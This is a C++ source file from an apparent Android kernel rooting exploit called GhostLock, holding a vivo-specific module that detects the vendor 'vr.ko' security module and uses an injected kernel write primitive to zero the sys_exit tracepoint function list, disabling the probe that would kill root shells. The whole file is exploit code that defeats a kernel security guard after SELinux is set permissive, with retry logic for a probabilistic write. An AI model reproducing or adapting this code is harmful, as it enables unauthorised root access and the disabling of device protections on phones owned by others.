/*
 * GhostLock - vr.ko guard execution (Android only).
 *
 * The plan (`plan_vr_guard` in vr_guard.hpp) turns the caller's View into a
 * write target; this unit carries the parts that need the device: the runtime
 * applicability check and the kernel write itself. Both the write and the
 * image->direct-map translation arrive through `AncillaryOps`, injected by the
 * backend call site, so this module names no backend type and stays within the
 * platform -> {contract, memory, profile, ancillary, support} dependency set.
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "platform/vivo/vr_guard.hpp"

#if defined(__ANDROID__)

#include <array>
#include <cstdio>
#include <string_view>
#include <unistd.h>

#include "kernelsnitch/utils.h"
#include "memory/target.h"
#include "support/native_resource.hpp"

namespace ghostlock::platform::vivo {
    namespace {
        /* vr.ko present in /proc/modules? Cached: the answer cannot change while
         * the run lasts. An unreadable /proc/modules counts as "not present":
         * the view already gated the behavior, and a missing vr.ko means there
         * is nothing to neutralize (guide section 5, fail safe). */
        bool vr_module_present() {
            static int32_t cached = -1;
            if (cached >= 0) return cached != 0;
            cached = 0;
            if (FILE *modules = fopen("/proc/modules", "r")) {
                auto close_modules = ghostlock::support::make_scope_exit(
                    [modules]() noexcept { fclose(modules); });
                std::array<char, 256> line{};
                while (fgets(line.data(), static_cast<int32_t>(line.size()), modules)) {
                    const std::string_view text(line.data());
                    /* strncasecmp(text, "vr", 2), then the module-name
                     * separator. */
                    const bool vr_prefix =
                            text.size() >= 2 && (text[0] == 'v' || text[0] == 'V') &&
                            (text[1] == 'r' || text[1] == 'R');
                    if (vr_prefix && text.size() > 2 &&
                        (text[2] == ' ' || text[2] == '_')) {
                        cached = 1;
                        break;
                    }
                }
            }
            return cached != 0;
        }

        /* Five attempts: the write primitive is probabilistic per stage. */
        constexpr int32_t kVrGuardAttempts = 5;
    } // namespace

    Status execute_vr_guard(AncillaryStage stage, AncillaryOps &ops,
                            const View &view) noexcept {
        /* One stage only: with SELinux permissive and no victim spawned yet, a
         * single write covers every process this run will bring up. */
        if (stage != AncillaryStage::PreSpawn) return true;

        const std::optional<VrGuardPlan> plan = plan_vr_guard(view);
        if (!plan.has_value()) return true; /* view does not carry it */

        if (!vr_module_present()) {
            pr_info("vr guard: vr.ko not present; nothing to neutralize\n");
            return true;
        }
        if (!ops.write_available || ops.write_zero == nullptr ||
            ops.image_to_direct_map == nullptr) {
            pr_warning("vr guard: no write primitive available; vr.ko probe left "
                       "armed (ksud shells may be killed)\n");
            return false;
        }

        const uintptr_t image = static_cast<uintptr_t>(
                memory::KIMAGE_TEXT_BASE + plan->image_offset);
        const uintptr_t target = ops.image_to_direct_map(image);
        pr_info("vr guard: neutralizing __tracepoint_sys_exit.funcs "
                "image=%016zx target=%016zx width=%u\n",
                static_cast<size_t>(image), static_cast<size_t>(target),
                plan->width_bytes);

        for (int32_t attempt = 1; attempt <= kVrGuardAttempts; attempt++) {
            if (ops.write_zero(target, "vr guard: sys_exit tp->funcs")) {
                pr_success("vr guard: sys_exit probe disabled (attempt %d)\n", attempt);
                return true;
            }
            pr_warning("vr guard: attempt %d failed, retrying\n", attempt);
            usleep(50000);
        }
        /* Not fatal for the exploit itself: root is still granted, the shells it
         * leads to are what suffers. Report the failure and let the caller log
         * it; the run continues. */
        pr_warning("vr guard: all %d attempts failed; ksud shells may be killed\n",
                   kVrGuardAttempts);
        return false;
    }
} // namespace ghostlock::platform::vivo

#endif
